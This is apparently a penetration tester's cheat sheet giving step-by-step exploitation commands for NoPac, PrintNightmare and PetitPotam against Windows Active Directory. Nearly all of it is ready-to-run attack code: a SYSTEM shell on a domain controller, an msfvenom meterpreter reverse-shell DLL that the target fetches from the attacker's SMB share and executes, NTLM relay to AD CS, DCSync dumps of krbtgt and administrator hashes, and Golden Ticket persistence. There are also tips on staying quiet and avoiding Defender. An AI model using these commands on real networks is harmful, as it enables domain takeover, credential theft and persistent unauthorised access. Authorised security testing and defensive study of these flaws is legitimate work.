# Bleeding Edge Vulnerabilities — NoPac / PrintNightmare / PetitPotam

All three work from standard domain user creds (NoPac, PrintNightmare) or unauthenticated (PetitPotam). All lead to domain compromise.

---

## NoPac (CVE-2021-42278 + 42287)

Prerequisite: `ms-DS-MachineAccountQuota` > 0 (default 10). Scan first:

```bash
sudo python3 scanner.py <DOMAIN>/<USER>:<PASS> -dc-ip <DC_IP> -use-ldap
```

Get SYSTEM shell on DC as standard domain user:

```bash
sudo python3 noPac.py <DOMAIN>/<USER>:<PASS> -dc-ip <DC_IP> -dc-host <DC_HOSTNAME> -shell --impersonate administrator -use-ldap
```

> [!warning] Shell is via smbexec — must use full paths, no `cd`. Noisy, likely flagged by Defender. Use `-dump` instead if opsec matters.

DCSync directly via noPac (quieter than shell):

```bash
sudo python3 noPac.py <DOMAIN>/<USER>:<PASS> -dc-ip <DC_IP> -dc-host <DC_HOSTNAME> --impersonate administrator -use-ldap -dump -just-dc-user <DOMAIN>/administrator
```

Tool saves `.ccache` ticket to disk — use for PTT/DCSync separately if needed. Clean up the ccache after.

---

## PrintNightmare (CVE-2021-34527 / CVE-2021-1675)

Check if Print Spooler is exposed first:

```bash
rpcdump.py @<DC_IP> | egrep 'MS-RPRN|MS-PAR'
```

Generate DLL payload, host on SMB share, catch with MSF handler:

```bash
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=<LHOST> LPORT=<LPORT> -f dll > <PAYLOAD>.dll
sudo smbserver.py -smb2support <SHARENAME> /path/to/<PAYLOAD>.dll
```

Run the exploit — target fetches DLL from your share and executes it as SYSTEM:

```bash
sudo python3 CVE-2021-1675.py <DOMAIN>/<USER>:<PASS>@<DC_IP> '\\<LHOST>\<SHARENAME>\<PAYLOAD>.dll'
```

> [!warning] Can crash the print spooler service. Confirm with client before running. Also: cube0x0's exploit requires cube0x0's fork of Impacket — conflicts with standard Impacket.

---

## PetitPotam (CVE-2021-36942) — Requires AD CS in environment

Coerces DC to authenticate to your host → relay to AD CS Web Enrollment → get DC certificate → DCSync.

Window 1 — start relay, targeting CA Web Enrollment:

```bash
sudo ntlmrelayx.py -debug -smb2support --target http://<CA_HOST>/certsrv/certfnsh.asp --adcs --template DomainController
```

Window 2 — trigger DC authentication:

```bash
python3 PetitPotam.py <LHOST> <DC_IP>
```

ntlmrelayx catches the auth and outputs a base64 certificate blob. Then use it to get a TGT for the DC machine account:

```bash
python3 /opt/PKINITtools/gettgtpkinit.py <DOMAIN>/<DC_HOSTNAME>$ -pfx-base64 <BASE64_BLOB> dc01.ccache
export KRB5CCNAME=dc01.ccache
```

DCSync using the DC's TGT:

```bash
secretsdump.py -just-dc-user <DOMAIN>/administrator -k -no-pass "<DC_HOSTNAME>$"@<DC_FQDN>
```

Alt path — extract NT hash from TGT using PAC (U2U):

```bash
python /opt/PKINITtools/getnthash.py -key <AS-REP_KEY> <DOMAIN>/<DC_HOSTNAME>$
secretsdump.py -just-dc-user <DOMAIN>/administrator "<DC_HOSTNAME>$"@<DC_IP> -hashes aad3c435b514a4eeaad3b935b51304fe:<NT_HASH>
```

From Windows — use base64 cert blob with Rubeus for PTT directly:

```powershell
.\Rubeus.exe asktgt /user:<DC_HOSTNAME>$ /certificate:<BASE64_BLOB> /ptt
```

Then DCSync via Mimikatz:

```
mimikatz # lsadump::dcsync /user:<DOMAIN>\krbtgt
```

> [!warning] PetitPotam works unauthenticated. If AD CS is present in the environment, this is a near-automatic path to DA. Check for CA with `certi` if the location isn't known.

> [!tip] After getting the DC machine account TGT via PetitPotam/NoPac, grab the `krbtgt` hash via DCSync → Golden Ticket persistence. Grab `administrator` hash → immediate PTH to DA.